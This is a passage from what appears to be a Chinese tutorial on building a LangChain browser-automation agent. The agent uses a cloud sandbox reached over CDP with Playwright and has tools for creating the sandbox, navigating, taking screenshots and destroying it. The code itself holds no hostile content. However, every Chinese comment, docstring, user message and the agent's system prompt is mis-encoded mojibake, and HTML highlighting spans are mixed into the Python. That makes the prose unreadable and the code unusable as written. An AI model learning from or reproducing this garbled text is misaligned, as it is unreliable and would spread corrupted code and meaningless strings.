    def <span class="hljs-title function_">get_vnc_url</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"è·å– VNC URL"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">get_vnc_url</span>()
    
    def <span class="hljs-title function_">get_sandbox_id</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"è·å– Sandbox ID"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox_id</span>
    
    def <span class="hljs-title function_">destroy</span>(self) -&gt; <span class="hljs-attr">str</span>:
        <span class="hljs-string">""</span><span class="hljs-string">"
        é”€æ¯å½“å‰çš„ sandbox å®ä¾‹
        
        Returns:
            str: æ“ä½œç»“æœæè¿°
        "</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is <span class="hljs-title class_">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"æ²¡æœ‰æ´»åŠ¨çš„ sandbox"</span>
        
        <span class="hljs-attr">try</span>:
            sandbox_id = self.<span class="hljs-property">_sandbox_id</span>
            
            # å°è¯•é”€æ¯ sandbox
            <span class="hljs-keyword">if</span> <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'delete'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">delete</span>()
            elif <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'stop'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">stop</span>()
            elif <span class="hljs-title function_">hasattr</span>(self.<span class="hljs-property">_sandbox</span>, <span class="hljs-string">'destroy'</span>):
                self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">destroy</span>()
            
            # æ¸…ç†çŠ¶æ€
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_sandbox_id</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_cdp_url</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_vnc_url</span> = <span class="hljs-title class_">None</span>
            
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"Sandbox å·²é”€æ¯: {sandbox_id}"</span>
        
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            # å³ä½¿é”€æ¯å¤±è´¥ï¼Œä¹Ÿæ¸…ç†æœ¬åœ°çŠ¶æ€
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_sandbox_id</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_cdp_url</span> = <span class="hljs-title class_">None</span>
            self.<span class="hljs-property">_vnc_url</span> = <span class="hljs-title class_">None</span>
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"é”€æ¯ Sandbox æ—¶å‡ºé”™: {str(e)}"</span>
    
    def <span class="hljs-title function_">is_active</span>(self) -&gt; <span class="hljs-attr">bool</span>:
        <span class="hljs-string">""</span><span class="hljs-string">"æ£€æŸ¥ sandbox æ˜¯å¦æ´»è·ƒ"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span> is not <span class="hljs-title class_">None</span>
    
    def <span class="hljs-title function_">__enter__</span>(self):
        <span class="hljs-string">""</span><span class="hljs-string">"ä¸Šä¸‹æ–‡ç®¡ç†å™¨å…¥å£"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self
    
    def <span class="hljs-title function_">__exit__</span>(self, exc_type, exc_val, exc_tb):
        <span class="hljs-string">""</span><span class="hljs-string">"ä¸Šä¸‹æ–‡ç®¡ç†å™¨é€€å‡ºï¼Œè‡ªåŠ¨é”€æ¯"</span><span class="hljs-string">""</span>
        self.<span class="hljs-title function_">destroy</span>()
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">False</span>


# å…¨å±€å•ä¾‹ï¼ˆå¯é€‰ï¼Œç”¨äºç®€å•åœºæ™¯ï¼‰
<span class="hljs-attr">_global_manager</span>: <span class="hljs-title class_">Optional</span>[<span class="hljs-title class_">SandboxManager</span>] = <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">get_global_manager</span>() -&gt; <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"è·å–å…¨å±€ SandboxManager å•ä¾‹"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _global_manager
    <span class="hljs-keyword">if</span> _global_manager is <span class="hljs-title class_">None</span>:
        _global_manager = <span class="hljs-title class_">SandboxManager</span>()
    <span class="hljs-keyword">return</span> _global_manager


def <span class="hljs-title function_">reset_global_manager</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"é‡ç½®å…¨å±€ SandboxManager"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _global_manager
    <span class="hljs-keyword">if</span> <span class="hljs-attr">_global_manager</span>:
        _global_manager.<span class="hljs-title function_">destroy</span>()
    _global_manager = <span class="hljs-title class_">None</span>
</code></pre>
<p><strong>å…³é”®åŠŸèƒ½ï¼š</strong></p>
<ol>
<li><strong>åˆ›å»º Sandbox</strong>: ä½¿ç”¨ AgentRun SDK åˆ›å»ºæµè§ˆå™¨ Sandbox</li>
<li><strong>è·å–è¿æ¥ä¿¡æ¯</strong>: è‡ªåŠ¨è·å– CDP URL å’Œ VNC URLï¼Œæ”¯æŒå¤šç§å±æ€§åå…¼å®¹</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>: æä¾›é”€æ¯æ–¹æ³•ï¼Œç¡®ä¿èµ„æºæ­£ç¡®é‡Šæ”¾</li>
</ol>
<h5 data-id="heading-16">æ­¥éª¤ 4: åˆ›å»º LangChain Tools å’Œ Agent</h5>
<p>åˆ›å»º <code>langchain_agent.py</code> æ–‡ä»¶ï¼Œå®šä¹‰ LangChain tools å¹¶åˆ›å»º Agentã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
LangChain Agent å’Œ Tools æ³¨å†Œæ¨¡å—

è´Ÿè´£åˆ›å»º LangChain Agentï¼Œæ³¨å†Œ Sandbox ç›¸å…³çš„ toolsï¼Œå¹¶é›†æˆ VNC å¯è§†åŒ–ã€‚

æœ¬æ¨¡å—ä½¿ç”¨ sandbox_manager.py ä¸­å°è£…çš„ SandboxManager æ¥ç®¡ç† sandbox ç”Ÿå‘½å‘¨æœŸã€‚
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> langchain.<span class="hljs-property">tools</span> <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> <span class="hljs-title class_">ChatOpenAI</span>
<span class="hljs-keyword">from</span> langchain.<span class="hljs-property">agents</span> <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> <span class="hljs-title class_">BaseModel</span>, <span class="hljs-title class_">Field</span>

# å¯¼å…¥ sandbox ç®¡ç†å™¨
<span class="hljs-keyword">from</span> sandbox_manager <span class="hljs-keyword">import</span> <span class="hljs-title class_">SandboxManager</span>

# åŠ è½½ç¯å¢ƒå˜é‡
<span class="hljs-title function_">load_dotenv</span>()

# å…¨å±€ sandbox ç®¡ç†å™¨å®ä¾‹ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰
<span class="hljs-attr">_sandbox_manager</span>: <span class="hljs-title class_">SandboxManager</span> | <span class="hljs-title class_">None</span> = <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">get_sandbox_manager</span>() -&gt; <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"è·å– sandbox ç®¡ç†å™¨å®ä¾‹ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _sandbox_manager
    <span class="hljs-keyword">if</span> _sandbox_manager is <span class="hljs-title class_">None</span>:
        _sandbox_manager = <span class="hljs-title class_">SandboxManager</span>()
    <span class="hljs-keyword">return</span> _sandbox_manager


# ============ <span class="hljs-title class_">LangChain</span> <span class="hljs-title class_">Tools</span> å®šä¹‰ ============

<span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">create_browser_sandbox</span>(
    <span class="hljs-attr">template_name</span>: str = <span class="hljs-title class_">None</span>,
    <span class="hljs-attr">idle_timeout</span>: int = <span class="hljs-number">3000</span>
) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"åˆ›å»ºæˆ–è·å–ä¸€ä¸ªæµè§ˆå™¨ sandbox å®ä¾‹ã€‚
    
    å½“éœ€è¦è®¿é—®ç½‘é¡µã€æ‰§è¡Œæµè§ˆå™¨æ“ä½œæ—¶ï¼Œé¦–å…ˆéœ€è¦åˆ›å»º sandboxã€‚
    åˆ›å»ºæˆåŠŸåï¼Œä¼šè¿”å› sandbox ä¿¡æ¯ï¼ŒåŒ…æ‹¬ VNC URL ç”¨äºå¯è§†åŒ–ã€‚
    
    Args:
        template_name: Sandbox æ¨¡æ¿åç§°ï¼Œå¦‚æœä¸æä¾›åˆ™ä»ç¯å¢ƒå˜é‡ BROWSER_TEMPLATE_NAME è¯»å–
        idle_timeout: ç©ºé—²è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ï¼Œé»˜è®¤ 3000 ç§’
    
    Returns:
        Sandbox ä¿¡æ¯å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬ IDã€CDP URLã€VNC URL
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        # å¦‚æœ template_name ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè½¬æ¢ä¸º <span class="hljs-title class_">None</span> ä»¥ä¾¿ä»ç¯å¢ƒå˜é‡è¯»å–
        <span class="hljs-keyword">if</span> template_name == <span class="hljs-string">""</span>:
            template_name = <span class="hljs-title class_">None</span>
        info = manager.<span class="hljs-title function_">create</span>(template_name=template_name, idle_timeout=idle_timeout)
        
        result = f<span class="hljs-string">""</span><span class="hljs-string">"âœ… Sandbox åˆ›å»ºæˆåŠŸï¼

ğŸ“‹ Sandbox ä¿¡æ¯:
- ID: {info['sandbox_id']}
- CDP URL: {info['cdp_url']}
"</span><span class="hljs-string">""</span>
        
        vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
            result += f<span class="hljs-string">"- VNC URL: {vnc_url}\n\n"</span>
            result += <span class="hljs-string">"æç¤º: VNC æŸ¥çœ‹å™¨åº”è¯¥å·²è‡ªåŠ¨æ‰“å¼€ï¼Œæ‚¨å¯ä»¥åœ¨æµè§ˆå™¨ä¸­å®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œã€‚"</span>
        <span class="hljs-attr">else</span>:
            result += <span class="hljs-string">"\nè­¦å‘Š: æœªè·å–åˆ° VNC URLï¼Œå¯èƒ½æ— æ³•ä½¿ç”¨å¯è§†åŒ–åŠŸèƒ½ã€‚"</span>
        
        <span class="hljs-keyword">return</span> result
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" åˆ›å»º Sandbox å¤±è´¥: {str(e)}"</span>


<span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">get_sandbox_info</span>() -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"è·å–å½“å‰ sandbox çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ IDã€CDP URLã€VNC URL ç­‰ã€‚
    
    å½“éœ€è¦æŸ¥çœ‹å½“å‰ sandbox çŠ¶æ€æˆ–è·å– VNC è¿æ¥ä¿¡æ¯æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚
    
    Returns:
        Sandbox ä¿¡æ¯å­—ç¬¦ä¸²
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        info = manager.<span class="hljs-title function_">get_info</span>()
        
        result = f<span class="hljs-string">""</span><span class="hljs-string">"ğŸ“‹ å½“å‰ Sandbox ä¿¡æ¯:

- Sandbox ID: {info['sandbox_id']}
- CDP URL: {info['cdp_url']}
"</span><span class="hljs-string">""</span>
        
        <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
            result += f<span class="hljs-string">"- VNC URL: {info['vnc_url']}\n\n"</span>
            result += <span class="hljs-string">"æ‚¨å¯ä»¥ä½¿ç”¨ VNC URL åœ¨æµè§ˆå™¨ä¸­å®æ—¶æŸ¥çœ‹æ“ä½œè¿‡ç¨‹ã€‚\n"</span>
            result += <span class="hljs-string">"   æ¨èä½¿ç”¨ vnc.html æ–‡ä»¶æˆ– noVNC å®¢æˆ·ç«¯ã€‚"</span>
        
        <span class="hljs-keyword">return</span> result
    
    except <span class="hljs-title class_">RuntimeError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" {str(e)}"</span>
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" è·å– Sandbox ä¿¡æ¯å¤±è´¥: {str(e)}"</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">NavigateInput</span>(<span class="hljs-title class_">BaseModel</span>):
    <span class="hljs-string">""</span><span class="hljs-string">"æµè§ˆå™¨å¯¼èˆªè¾“å…¥å‚æ•°"</span><span class="hljs-string">""</span>
    <span class="hljs-attr">url</span>: str = <span class="hljs-title class_">Field</span>(description=<span class="hljs-string">"è¦è®¿é—®çš„ç½‘é¡µ URLï¼Œå¿…é¡»ä»¥ http:// æˆ– https:// å¼€å¤´"</span>)
    <span class="hljs-attr">wait_until</span>: str = <span class="hljs-title class_">Field</span>(
        <span class="hljs-keyword">default</span>=<span class="hljs-string">"load"</span>,
        description=<span class="hljs-string">"ç­‰å¾…é¡µé¢åŠ è½½çš„çŠ¶æ€: load, domcontentloaded, networkidle"</span>
    )
    <span class="hljs-attr">timeout</span>: int = <span class="hljs-title class_">Field</span>(
        <span class="hljs-keyword">default</span>=<span class="hljs-number">30000</span>,
        description=<span class="hljs-string">"è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ï¼Œé»˜è®¤ 30000"</span>
    )


<span class="hljs-meta">@tool</span>(args_schema=<span class="hljs-title class_">NavigateInput</span>)
def <span class="hljs-title function_">navigate_to_url</span>(<span class="hljs-attr">url</span>: str, <span class="hljs-attr">wait_until</span>: str = <span class="hljs-string">"load"</span>, <span class="hljs-attr">timeout</span>: int = <span class="hljs-number">30000</span>) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"ä½¿ç”¨ sandbox ä¸­çš„æµè§ˆå™¨å¯¼èˆªåˆ°æŒ‡å®š URLã€‚
    
    å½“ç”¨æˆ·éœ€è¦è®¿é—®ç½‘é¡µæ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚å¯¼èˆªåå¯ä»¥åœ¨ VNC ä¸­å®æ—¶æŸ¥çœ‹é¡µé¢ã€‚
    
    Args:
        url: è¦è®¿é—®çš„ç½‘é¡µ URL
        wait_until: ç­‰å¾…é¡µé¢åŠ è½½çš„çŠ¶æ€ï¼ˆload/domcontentloaded/networkidleï¼‰
        timeout: è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
    
    Returns:
        å¯¼èˆªç»“æœæè¿°
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        
        <span class="hljs-keyword">if</span> not manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: è¯·å…ˆåˆ›å»º sandbox"</span>
        
        # éªŒè¯ <span class="hljs-variable constant_">URL</span>
        <span class="hljs-keyword">if</span> not url.<span class="hljs-title function_">startswith</span>((<span class="hljs-string">"http://"</span>, <span class="hljs-string">"https://"</span>)):
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" é”™è¯¯: æ— æ•ˆçš„ URL æ ¼å¼: {url}"</span>
        
        cdp_url = manager.<span class="hljs-title function_">get_cdp_url</span>()
        <span class="hljs-keyword">if</span> not <span class="hljs-attr">cdp_url</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: æ— æ³•è·å– CDP URL"</span>
        
        # ä½¿ç”¨ <span class="hljs-title class_">Playwright</span> è¿æ¥æµè§ˆå™¨å¹¶å¯¼èˆª
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
            
            <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
                browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
                pages = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span> <span class="hljs-keyword">if</span> browser.<span class="hljs-property">contexts</span> <span class="hljs-keyword">else</span> []
                
                <span class="hljs-keyword">if</span> <span class="hljs-attr">pages</span>:
                    page = pages[<span class="hljs-number">0</span>]
                <span class="hljs-attr">else</span>:
                    page = browser.<span class="hljs-title function_">new_page</span>()
                
                page.<span class="hljs-title function_">goto</span>(url, wait_until=wait_until, timeout=timeout)
                title = page.<span class="hljs-title function_">title</span>()
                
                <span class="hljs-keyword">return</span> f<span class="hljs-string">"å·²æˆåŠŸå¯¼èˆªåˆ°: {url}\nğŸ“„ é¡µé¢æ ‡é¢˜: {title}\nğŸ’¡ æ‚¨å¯ä»¥åœ¨ VNC ä¸­æŸ¥çœ‹é¡µé¢å†…å®¹ã€‚"</span>
        
        except <span class="hljs-title class_">ImportError</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">"å¯¼èˆªæŒ‡ä»¤å·²å‘é€: {url}\nğŸ’¡ æç¤º: å®‰è£… playwright ä»¥å¯ç”¨å®é™…å¯¼èˆªåŠŸèƒ½ (pip install playwright)"</span>
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" å¯¼èˆªå¤±è´¥: {str(e)}"</span>
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" æ“ä½œå¤±è´¥: {str(e)}"</span>


<span class="hljs-meta">@tool</span>(<span class="hljs-string">"browser_screenshot"</span>, description=<span class="hljs-string">"åœ¨æµè§ˆå™¨ sandbox ä¸­æˆªå–å½“å‰é¡µé¢æˆªå›¾"</span>)
def <span class="hljs-title function_">take_screenshot</span>(<span class="hljs-attr">filename</span>: str = <span class="hljs-string">"screenshot.png"</span>) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"æˆªå–æµè§ˆå™¨å½“å‰é¡µé¢çš„æˆªå›¾ã€‚
    
    Args:
        filename: æˆªå›¾æ–‡ä»¶åï¼Œé»˜è®¤ "</span>screenshot.<span class="hljs-property">png</span><span class="hljs-string">"
    
    Returns:
        æ“ä½œç»“æœ
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        
        <span class="hljs-keyword">if</span> not manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: è¯·å…ˆåˆ›å»º sandbox"</span>
        
        cdp_url = manager.<span class="hljs-title function_">get_cdp_url</span>()
        <span class="hljs-keyword">if</span> not <span class="hljs-attr">cdp_url</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: æ— æ³•è·å– CDP URL"</span>
        
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
            
            <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
                browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
                pages = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span> <span class="hljs-keyword">if</span> browser.<span class="hljs-property">contexts</span> <span class="hljs-keyword">else</span> []
                
                <span class="hljs-keyword">if</span> <span class="hljs-attr">pages</span>:
                    page = pages[<span class="hljs-number">0</span>]
                <span class="hljs-attr">else</span>:
                    <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: æ²¡æœ‰æ‰“å¼€çš„é¡µé¢"</span>
                
                page.<span class="hljs-title function_">screenshot</span>(path=filename)
                <span class="hljs-keyword">return</span> f<span class="hljs-string">"æˆªå›¾å·²ä¿å­˜: {filename}"</span>
        
        except <span class="hljs-title class_">ImportError</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">" é”™è¯¯: éœ€è¦å®‰è£… playwright (pip install playwright)"</span>
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-keyword">return</span> f<span class="hljs-string">" æˆªå›¾å¤±è´¥: {str(e)}"</span>
    
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" æ“ä½œå¤±è´¥: {str(e)}"</span>


<span class="hljs-meta">@tool</span>(<span class="hljs-string">"destroy_sandbox"</span>, description=<span class="hljs-string">"é”€æ¯å½“å‰çš„ sandbox å®ä¾‹ï¼Œé‡Šæ”¾èµ„æºã€‚æ³¨æ„ï¼šä»…åœ¨ç¨‹åºé€€å‡ºæˆ–æ˜ç¡®éœ€è¦é‡Šæ”¾èµ„æºæ—¶ä½¿ç”¨ï¼Œä¸è¦åœ¨ä¸€è½®å¯¹è¯åé”€æ¯ã€‚"</span>)
def <span class="hljs-title function_">destroy_sandbox</span>() -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"é”€æ¯å½“å‰çš„ sandbox å®ä¾‹ã€‚
    
    é‡è¦æç¤ºï¼šæ­¤å·¥å…·åº”è¯¥ä»…åœ¨ä»¥ä¸‹æƒ…å†µä½¿ç”¨ï¼š
    - ç¨‹åºå³å°†é€€å‡º
    - æ˜ç¡®éœ€è¦é‡Šæ”¾èµ„æº
    - ç”¨æˆ·æ˜ç¡®è¦æ±‚é”€æ¯
    
    ä¸è¦åœ¨ä¸€è½®å¯¹è¯å®Œæˆåå°±é”€æ¯ sandboxï¼Œå› ä¸º sandbox å¯ä»¥åœ¨å¤šè½®å¯¹è¯ä¸­å¤ç”¨ã€‚
    
    Returns:
        æ“ä½œç»“æœ
    "</span><span class="hljs-string">""</span>
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        result = manager.<span class="hljs-title function_">destroy</span>()
        <span class="hljs-keyword">return</span> result
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-keyword">return</span> f<span class="hljs-string">" é”€æ¯å¤±è´¥: {str(e)}"</span>


# ============ <span class="hljs-title class_">Agent</span> åˆ›å»º ============

def <span class="hljs-title function_">create_browser_agent</span>(<span class="hljs-attr">system_prompt</span>: str = <span class="hljs-title class_">None</span>):
    <span class="hljs-string">""</span><span class="hljs-string">"
    åˆ›å»ºå¸¦æœ‰ sandbox å·¥å…·çš„ LangChain Agent
    
    Args:
        system_prompt: è‡ªå®šä¹‰ç³»ç»Ÿæç¤ºè¯ï¼Œå¦‚æœä¸º None åˆ™ä½¿ç”¨é»˜è®¤æç¤ºè¯
    
    Returns:
        LangChain Agent å®ä¾‹
    "</span><span class="hljs-string">""</span>
    # é…ç½® <span class="hljs-title class_">DashScope</span> <span class="hljs-variable constant_">API</span>
    api_key = os.<span class="hljs-title function_">getenv</span>(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>)
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">api_key</span>:
        raise <span class="hljs-title class_">ValueError</span>(<span class="hljs-string">"è¯·è®¾ç½®ç¯å¢ƒå˜é‡ DASHSCOPE_API_KEY"</span>)
    
    base_url = <span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>
    model_name = os.<span class="hljs-title function_">getenv</span>(<span class="hljs-string">"QWEN_MODEL"</span>, <span class="hljs-string">"qwen-plus"</span>)
    
    # åˆ›å»º <span class="hljs-variable constant_">LLM</span>
    model = <span class="hljs-title class_">ChatOpenAI</span>(
        model=model_name,
        api_key=api_key,
        base_url=base_url,
        temperature=<span class="hljs-number">0.7</span>,
    )
    
    # åˆ›å»ºå·¥å…·åˆ—è¡¨
    tools = [
        create_browser_sandbox,
        get_sandbox_info,
        navigate_to_url,
        take_screenshot,
        destroy_sandbox,
    ]
    
    # é»˜è®¤ç³»ç»Ÿæç¤ºè¯
    <span class="hljs-keyword">if</span> system_prompt is <span class="hljs-title class_">None</span>:
        system_prompt = <span class="hljs-string">""</span><span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæµè§ˆå™¨è‡ªåŠ¨åŒ–åŠ©æ‰‹ï¼Œå¯ä»¥ä½¿ç”¨ sandbox æ¥è®¿é—®å’Œæ“ä½œç½‘é¡µã€‚

å½“ç”¨æˆ·éœ€è¦è®¿é—®ç½‘é¡µæ—¶ï¼Œè¯·æŒ‰ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š
1. é¦–å…ˆåˆ›å»ºæˆ–è·å– sandboxï¼ˆå¦‚æœè¿˜æ²¡æœ‰ï¼‰
2. ä½¿ç”¨ navigate_to_url å¯¼èˆªåˆ°ç›®æ ‡ç½‘é¡µ
3. æ‰§è¡Œç”¨æˆ·è¯·æ±‚çš„æ“ä½œ
4. å¦‚æœéœ€è¦ï¼Œå¯ä»¥æˆªå–æˆªå›¾

é‡è¦æç¤ºï¼š
- åˆ›å»º sandbox åï¼Œä¼šè¿”å› VNC URLï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å®ƒå®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œ
- æ‰€æœ‰æ“ä½œéƒ½ä¼šåœ¨ VNC ä¸­å®æ—¶æ˜¾ç¤ºï¼Œæ–¹ä¾¿è°ƒè¯•å’Œç›‘æ§
- sandbox å¯ä»¥åœ¨å¤šè½®å¯¹è¯ä¸­å¤ç”¨ï¼Œä¸è¦åœ¨ä¸€è½®å¯¹è¯å®Œæˆåå°±é”€æ¯
- åªæœ‰åœ¨ç”¨æˆ·æ˜ç¡®è¦æ±‚é”€æ¯æ—¶æ‰ä½¿ç”¨ destroy_sandbox å·¥å…·
- ä¸è¦ä¸»åŠ¨å»ºè®®ç”¨æˆ·é”€æ¯ sandboxï¼Œé™¤éç”¨æˆ·æ˜ç¡®è¦æ±‚
- è¯·å§‹ç»ˆç”¨ä¸­æ–‡å›å¤ï¼Œç¡®ä¿æ“ä½œå‡†ç¡®ã€é«˜æ•ˆã€‚"</span><span class="hljs-string">""</span>
    
    # åˆ›å»º <span class="hljs-title class_">Agent</span>
    agent = <span class="hljs-title function_">create_agent</span>(
        model=model,
        tools=tools,
        system_prompt=system_prompt,
    )
    
    <span class="hljs-keyword">return</span> agent


def <span class="hljs-title function_">get_available_tools</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"è·å–æ‰€æœ‰å¯ç”¨çš„å·¥å…·åˆ—è¡¨"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">return</span> [
        create_browser_sandbox,
        get_sandbox_info,
        navigate_to_url,
        take_screenshot,
        destroy_sandbox,
    ]
</code></pre>
<p><strong>å…³é”®è¦ç‚¹ï¼š</strong></p>
<ol>
<li><strong>Tool å®šä¹‰</strong>: ä½¿ç”¨ <code>@tool</code> è£…é¥°å™¨å®šä¹‰ LangChain tools</li>
<li><strong>ç±»å‹æç¤º</strong>: æ‰€æœ‰å‚æ•°å¿…é¡»æœ‰ç±»å‹æç¤ºï¼Œç”¨äºç”Ÿæˆå·¥å…· schema</li>
<li><strong>æ–‡æ¡£å­—ç¬¦ä¸²</strong>: è¯¦ç»†çš„æ–‡æ¡£å­—ç¬¦ä¸²å¸®åŠ© LLM ç†è§£ä½•æ—¶ä½¿ç”¨å·¥å…·</li>
<li><strong>å•ä¾‹æ¨¡å¼</strong>: ä½¿ç”¨å…¨å±€ç®¡ç†å™¨å®ä¾‹ç¡®ä¿ Sandbox åœ¨ä¼šè¯ä¸­å¤ç”¨</li>
</ol>
